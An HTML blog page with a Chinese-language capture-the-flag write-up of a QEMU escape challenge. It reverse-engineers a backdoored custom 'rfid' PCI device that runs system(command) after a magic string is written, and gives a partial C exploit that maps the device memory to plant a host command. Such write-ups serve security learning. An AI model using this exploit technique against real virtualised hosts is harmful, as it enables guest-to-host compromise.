@@ -1,0 +1,274 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="referrer" content="no-referrer" />
+    <meta name="description" content="Description123456启动方式cd ~&#x2F;appendix&#x2F;socat tcp-l:6688,fork exec:.&#x2F;launch.sh,reuseaddr攻击效果连接6688端口，利用qemu漏洞逃逸，在宿主机上起一个计算器上台展示IP：10.66.21.4 Analyzeqemu启动脚本： 123456789#!&#x2F;bin&#x2F;sh.&amp;#x">
+<meta property="og:type" content="article">
+<meta property="og:title" content="QEMU Escape in  Cloud Security Game">
+<meta property="og:url" content="http://yoursite.com/2019/11/06/QEMU-Escape-in-Cloud-Security-Game/index.html">
+<meta property="og:site_name" content="Kirin&#39;s Blog">
+<meta property="og:description" content="Description123456启动方式cd ~&#x2F;appendix&#x2F;socat tcp-l:6688,fork exec:.&#x2F;launch.sh,reuseaddr攻击效果连接6688端口，利用qemu漏洞逃逸，在宿主机上起一个计算器上台展示IP：10.66.21.4 Analyzeqemu启动脚本： 123456789#!&#x2F;bin&#x2F;sh.&amp;#x">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/7434375-c3e5ffd52a5c73cf.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/7434375-9852a92121a27438.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="article:published_time" content="2019-11-06T04:33:52.000Z">
+<meta property="article:modified_time" content="2019-11-06T14:25:10.000Z">
+<meta property="article:author" content="Kirin">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://upload-images.jianshu.io/upload_images/7434375-c3e5ffd52a5c73cf.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>QEMU Escape in  Cloud Security Game</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2019/12/01/QEMU-Escape-Learning/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2019/10/15/HITCON-2019-LazyHouse/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2019/11/06/QEMU-Escape-in-Cloud-Security-Game/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2019/11/06/QEMU-Escape-in-Cloud-Security-Game/&text=QEMU Escape in  Cloud Security Game" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2019/11/06/QEMU-Escape-in-Cloud-Security-Game/&title=QEMU Escape in  Cloud Security Game" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2019/11/06/QEMU-Escape-in-Cloud-Security-Game/&is_video=false&description=QEMU Escape in  Cloud Security Game" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=QEMU Escape in  Cloud Security Game&body=Check out this article: http://yoursite.com/2019/11/06/QEMU-Escape-in-Cloud-Security-Game/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2019/11/06/QEMU-Escape-in-Cloud-Security-Game/&title=QEMU Escape in  Cloud Security Game" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2019/11/06/QEMU-Escape-in-Cloud-Security-Game/&title=QEMU Escape in  Cloud Security Game" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2019/11/06/QEMU-Escape-in-Cloud-Security-Game/&title=QEMU Escape in  Cloud Security Game" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2019/11/06/QEMU-Escape-in-Cloud-Security-Game/&title=QEMU Escape in  Cloud Security Game" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2019/11/06/QEMU-Escape-in-Cloud-Security-Game/&name=QEMU Escape in  Cloud Security Game&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Description"><span class="toc-number">1.</span> <span class="toc-text">Description</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Analyze"><span class="toc-number">2.</span> <span class="toc-text">Analyze</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploit"><span class="toc-number">3.</span> <span class="toc-text">Exploit</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EXP"><span class="toc-number">4.</span> <span class="toc-text">EXP</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        QEMU Escape in  Cloud Security Game
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Kirin's Blog</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2019-11-06T04:33:52.000Z" itemprop="datePublished">2019-11-06</time>
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">启动方式</span><br><span class="line">cd ~&#x2F;appendix&#x2F;</span><br><span class="line">socat tcp-l:6688,fork exec:.&#x2F;launch.sh,reuseaddr</span><br><span class="line">攻击效果</span><br><span class="line">连接6688端口，利用qemu漏洞逃逸，在宿主机上起一个计算器</span><br><span class="line">上台展示IP：10.66.21.4</span><br></pre></td></tr></table></figure>
+<h2 id="Analyze"><a href="#Analyze" class="headerlink" title="Analyze"></a>Analyze</h2><p>qemu启动脚本：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;sh</span><br><span class="line">.&#x2F;qemu-system-x86_64 \</span><br><span class="line">-initrd .&#x2F;initramfs.cpio \</span><br><span class="line">-kernel .&#x2F;vmlinuz-4.8.0-52-generic \</span><br><span class="line">-append &#39;console&#x3D;ttyS0 root&#x3D;&#x2F;dev&#x2F;ram oops&#x3D;panic panic&#x3D;1&#39; \</span><br><span class="line">-monitor &#x2F;dev&#x2F;null \</span><br><span class="line">-m 64M --nographic \</span><br><span class="line">-L pc-bios \</span><br><span class="line">-device rfid,id&#x3D;vda \</span><br></pre></td></tr></table></figure>
+<p>看到启动过程特意指定device-&gt;rfid<br>在qemu-system-x86_64中找到rfid实现部分<br>strings时发现了有趣的位置：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;home&#x2F;wang&#x2F;qemu&#x2F;hw&#x2F;misc&#x2F;myrfid.c</span><br></pre></td></tr></table></figure>
+<p>可以看到这里是在qemu/hw/misc/下实现了rfid设备的读写以及初始化操作，由此根据函数中由object_class_dynamic_cast_assert调用的字符串以及此类device在qemu中的固定实现即可恢复一些关键符号：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.data.rel.ro:0000000000FE9720 option_rw       dq offset rfid_read     ; DATA XREF: rfid_realize+111↑o</span><br><span class="line">.data.rel.ro:0000000000FE9728                 dq offset rfid_write</span><br><span class="line">.data.rel.ro:0000000000FE9730                 align 80h</span><br><span class="line">.data.rel.ro:0000000000FE9780 off_FE9780      dq offset aRfid         ; DATA XREF: sub_571438+4↑o</span><br><span class="line">.data.rel.ro:0000000000FE9780                                         ; &quot;rfid&quot;</span><br><span class="line">.data.rel.ro:0000000000FE9788                 dq offset aPciDevice_41 ; &quot;pci-device&quot;</span><br><span class="line">.data.rel.ro:0000000000FE9790                 dq offset stru_1B30</span><br><span class="line">.data.rel.ro:0000000000FE9798                 dq offset rfid_instance_init</span><br><span class="line">.data.rel.ro:0000000000FE97A0                 align 40h</span><br><span class="line">.data.rel.ro:0000000000FE97C0                 dq offset rfid_class_init</span><br></pre></td></tr></table></figure>
+<p><img src="https://upload-images.jianshu.io/upload_images/7434375-c3e5ffd52a5c73cf.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="function"><br><strong>很明显在rfid进行读操作时存在后门：</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> __int64 __<span class="function">fastcall <span class="title">rfid_read</span><span class="params">(__int64 a1, <span class="keyword">unsigned</span> __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v2; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( ((a2 &gt;&gt; <span class="number">20</span>) &amp; <span class="number">0xF</span>) != <span class="number">15</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = <span class="built_in">strlen</span>(magic_code);</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">memcmp</span>(code, magic_code, v2) )</span><br><span class="line">      system(command);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0x42066</span>LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到此处我们需要使code与magic_code相同并覆盖command而后通过读操作来达到escape：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.data:00000000010CC100 magic_code      dq offset aWwssadadbaba ; DATA XREF: rfid_read+47↑r</span><br><span class="line">.data:00000000010CC100                                         ; rfid_read+59↑r</span><br><span class="line">.data:00000000010CC100                                         ; &quot;wwssadadBABA&quot;</span><br></pre></td></tr></table></figure>
+<p>而在rfid的写操作中：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> *__ptr32 *__<span class="function">fastcall <span class="title">rfid_write</span><span class="params">(__int64 a1, <span class="keyword">unsigned</span> __int64 haddr, __int64 value, <span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="built_in">size</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> *__ptr32 *result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> n[<span class="number">12</span>]; <span class="comment">// [rsp+4h] [rbp-3Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+10h] [rbp-30h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+18h] [rbp-28h]</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// [rsp+2Ch] [rbp-14h]</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// [rsp+34h] [rbp-Ch]</span></span><br><span class="line">  __int64 v11; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line">  __int64 savedregs; <span class="comment">// [rsp+40h] [rbp+0h]</span></span><br><span class="line"></span><br><span class="line">  v7 = a1;</span><br><span class="line">  v6 = haddr;</span><br><span class="line">  *(_QWORD *)&amp;n[<span class="number">4</span>] = value;</span><br><span class="line">  v11 = a1;</span><br><span class="line">  v8 = (haddr &gt;&gt; <span class="number">20</span>) &amp; <span class="number">0xF</span>;</span><br><span class="line">  v9 = (haddr &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xF</span>;</span><br><span class="line">  result = off_9BC9B8;</span><br><span class="line">  <span class="keyword">switch</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)&amp;savedregs )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0u</span>:</span><br><span class="line">      <span class="keyword">if</span> ( v9 &gt;= <span class="number">0</span> &amp;&amp; v9 &lt;= <span class="number">15</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        result = (<span class="keyword">void</span> *__ptr32 *)code;</span><br><span class="line">        code[v9] = <span class="number">119</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1u</span>:</span><br><span class="line">      <span class="keyword">if</span> ( v9 &gt;= <span class="number">0</span> &amp;&amp; v9 &lt;= <span class="number">15</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        result = (<span class="keyword">void</span> *__ptr32 *)code;</span><br><span class="line">        code[v9] = <span class="number">115</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2u</span>:</span><br><span class="line">      <span class="keyword">if</span> ( v9 &gt;= <span class="number">0</span> &amp;&amp; v9 &lt;= <span class="number">15</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        result = (<span class="keyword">void</span> *__ptr32 *)code;</span><br><span class="line">        code[v9] = <span class="number">97</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3u</span>:</span><br><span class="line">      <span class="keyword">if</span> ( v9 &gt;= <span class="number">0</span> &amp;&amp; v9 &lt;= <span class="number">15</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        result = (<span class="keyword">void</span> *__ptr32 *)code;</span><br><span class="line">        code[v9] = <span class="number">100</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4u</span>:</span><br><span class="line">      <span class="keyword">if</span> ( v9 &gt;= <span class="number">0</span> &amp;&amp; v9 &lt;= <span class="number">15</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        result = (<span class="keyword">void</span> *__ptr32 *)code;</span><br><span class="line">        code[v9] = <span class="number">65</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">5u</span>:</span><br><span class="line">      <span class="keyword">if</span> ( v9 &gt;= <span class="number">0</span> &amp;&amp; v9 &lt;= <span class="number">15</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        result = (<span class="keyword">void</span> *__ptr32 *)code;</span><br><span class="line">        code[v9] = <span class="number">66</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">6u</span>:</span><br><span class="line">      v10 = (<span class="keyword">unsigned</span> __int16)v6;</span><br><span class="line">      result = (<span class="keyword">void</span> *__ptr32 *)<span class="built_in">memcpy</span>(&amp;command[(<span class="keyword">unsigned</span> __int16)v6], &amp;n[<span class="number">4</span>], <span class="built_in">size</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><strong>可以看到这里我们可以通过控制haddr和value来改写code和command，而haddr在虚拟机内部可控，只需先在虚拟机内部打开设备并映射到虚拟地址即可，进行读写操作时，对应虚拟地址空间的偏移即为设备对应的物理地址haddr</strong></p>
+<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p><strong>启动虚拟机后先查看当前存在的pci设备</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># lspci</span><br><span class="line">00:00.0 Class 0600: 8086:1237</span><br><span class="line">00:01.3 Class 0680: 8086:7113</span><br><span class="line">00:03.0 Class 0200: 8086:100e</span><br><span class="line">00:01.1 Class 0101: 8086:7010</span><br><span class="line">00:02.0 Class 0300: 1234:1111</span><br><span class="line">00:01.0 Class 0601: 8086:7000</span><br><span class="line">00:04.0 Class 00ff: 0420:1337</span><br></pre></td></tr></table></figure>
+<p><strong>在rfid设备的class_init函数中：</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> ***__<span class="function">fastcall <span class="title">rfid_class_init</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> ***result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  result = object_class_dynamic_cast_assert(</span><br><span class="line">             (<span class="keyword">const</span> <span class="keyword">char</span> ***)a1,</span><br><span class="line">             (<span class="keyword">const</span> <span class="keyword">char</span> **)<span class="string">"pci-device"</span>,</span><br><span class="line">             (__int64)<span class="string">"/home/wang/qemu/hw/misc/myrfid.c"</span>,</span><br><span class="line">             <span class="number">0x171</span>u,</span><br><span class="line">             (__int64)<span class="string">"rfid_class_init"</span>);</span><br><span class="line">  result[<span class="number">22</span>] = (<span class="keyword">const</span> <span class="keyword">char</span> **)rfid_realize;</span><br><span class="line">  result[<span class="number">23</span>] = <span class="number">0L</span>L;</span><br><span class="line">  *((_WORD *)result + <span class="number">104</span>) = <span class="number">0x420</span>;</span><br><span class="line">  *((_WORD *)result + <span class="number">105</span>) = <span class="number">0x1337</span>;</span><br><span class="line">  *((_BYTE *)result + <span class="number">212</span>) = <span class="number">0x69</span>;</span><br><span class="line">  *((_WORD *)result + <span class="number">107</span>) = <span class="number">0xFF</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><strong>可以看到rfid对应设备为00:04.0，打开其中的resource0(对应rfid设备的可映射内存空间)，而后根据上面的分析进行写操作布置好code和command，而后进行一次读操作触发system(command)即可</strong></p>
+<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> fd;</span><br><span class="line"><span class="keyword">char</span>* base_addr;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">magic_write</span><span class="params">(<span class="keyword">size_t</span> opt1,<span class="keyword">size_t</span> opt2,<span class="keyword">size_t</span> offset,<span class="keyword">char</span> value)</span></span>&#123;</span><br><span class="line">    <span class="keyword">long</span> final_op=(opt1 &lt;&lt; <span class="number">20</span>) | (opt2 &lt;&lt; <span class="number">16</span>) | offset;</span><br><span class="line">    *(base_addr+final_op)=value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//wwssadadBABA</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">write_code</span><span class="params">()</span></span>&#123;</span><br><span class="line">    magic_write(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    magic_write(<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    magic_write(<span class="number">1</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    magic_write(<span class="number">1</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    magic_write(<span class="number">2</span>,<span class="number">4</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    magic_write(<span class="number">3</span>,<span class="number">5</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    magic_write(<span class="number">2</span>,<span class="number">6</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    magic_write(<span class="number">3</span>,<span class="number">7</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    magic_write(<span class="number">5</span>,<span class="number">8</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    magic_write(<span class="number">4</span>,<span class="number">9</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    magic_write(<span class="number">5</span>,<span class="number">10</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    magic_write(<span class="number">4</span>,<span class="number">11</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">write_command</span><span class="params">(<span class="keyword">char</span>* command)</span></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> len=<span class="built_in">strlen</span>(command);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;len;i++)&#123;</span><br><span class="line">    magic_write(<span class="number">6</span>,<span class="number">0</span>,i,command[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"[+] Init device"</span>);</span><br><span class="line">    fd=<span class="built_in">open</span>(<span class="string">"/sys/devices/pci0000:00/0000:00:04.0/resource0"</span>,O_RDWR|O_SYNC);</span><br><span class="line">    base_addr = mmap(<span class="number">0</span>,<span class="number">0x1000000</span>,PROT_READ|PROT_WRITE,MAP_SHARED,fd, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"device mmap addr=0x%llx\n"</span>,base_addr);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"[+] Write magic_code"</span>);</span><br><span class="line">    write_code();</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"[+] Write 